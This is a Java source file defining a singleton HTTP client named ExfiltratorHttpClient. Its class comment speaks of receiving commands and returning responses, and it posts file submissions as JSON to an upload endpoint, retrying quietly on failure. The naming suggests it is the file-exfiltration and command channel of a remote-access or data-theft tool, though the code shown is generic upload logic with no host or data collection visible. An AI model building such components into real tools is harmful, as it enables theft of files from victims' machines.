package modules.net;

import modules.auxiliary.*;

import java.io.IOException;
import java.net.*;
import java.net.http.HttpClient;
import java.net.http.HttpClient.Version;
import java.net.http.HttpClient.Redirect;
import java.net.http.HttpRequest;
import java.net.http.HttpRequest.BodyPublishers;
import java.net.http.HttpResponse;
import java.time.Duration;

/**
    Responsible for communication with the API, received commands and their responses.

    @version 1.0
    @author Str1k3r
*/
public class ExfiltratorHttpClient {

    private static ExfiltratorHttpClient instance;
    private static HttpClient client;
    private Manager manager;

    private ExfiltratorHttpClient() {
        // HttpClient.Builder.build() => HttpClient
        manager = Manager.getInstance();
        client = manager.createHttpClient();
    }

    public static ExfiltratorHttpClient getInstance() {
        if(instance == null) {
            instance = new ExfiltratorHttpClient();
        }

        return instance;
    }

    public void uploadFile(FileSubmission submission) {
        HttpRequest request = HttpRequest.newBuilder()
                .uri(Endpoint.fileUpload())
                .version(Version.HTTP_2)
                .headers("Content-type", "application/json")
                .POST(BodyPublishers.ofString(manager.fileSubmissionToJSON(submission)))
                .build();

        int counter = 0;
        while(counter < 5) {// try multiple times
            try {
                HttpResponse<String> httpResponse = client.send(request, HttpResponse.BodyHandlers.ofString());

                if(httpResponse.statusCode() == 200) {
                    return;
                }
            } catch (Exception ioEx) {
                // IO or Interrupted exception
            }

            counter++;
        }
    }

    /**
        Send a file submission using HttpClient.

         @param submission The response to send.
         @param uri The uri to send to.

         @return Returns true if the response sent without error, false otherwise.
    */
    public <T> boolean sendSubmission(FileSubmission submission, URI uri) throws IOException, InterruptedException {
        Manager manager = Manager.getInstance();

        HttpRequest httpRequest = HttpRequest.newBuilder()
                .uri(uri)
                .version(Version.HTTP_2)
                .headers("Content-type", "application/json")
                .POST(BodyPublishers.ofString(manager.fileSubmissionToJSON(submission)))
                .build();


        HttpResponse<String> feedback = client.send(
                httpRequest, HttpResponse.BodyHandlers.ofString()
        );

        // extract modules.auxiliary.Response object and interprete result
        if(feedback.statusCode() == 200) {
            String content = feedback.body();

            Response responseObj = manager.jsonToResponse(content);

            return responseObj.code == EApiExecCode.SUCCESS.ordinal();
        }

        return false;
    }
}
